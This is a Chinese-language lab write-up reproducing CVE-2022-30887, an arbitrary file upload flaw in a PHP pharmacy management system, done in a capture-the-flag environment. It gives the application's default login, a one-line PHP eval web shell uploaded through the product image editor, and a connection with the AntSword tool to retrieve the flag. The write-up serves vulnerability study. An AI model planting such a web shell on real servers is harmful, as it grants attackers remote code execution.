---
title: CVE-2022-30887【文件上传】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - '文件上传'
---

## 1. 漏洞介绍

多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。

## 2. 漏洞复现

使用默认账号密码登录： `mayuri.infospace@gmail.com/mayurik`

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281705856.png)

登录后根据漏洞提示找到产品页并编辑，如下图：

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281705257.png)

上传一句话木马

```php
<?php
@eval($_POST['shell']);
?>
```

鼠标右击新标签打开查看木马路径

![image.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281707381.png)

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281707376.png)

用中国蚁剑连接获取flag即可

![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281708882.png)
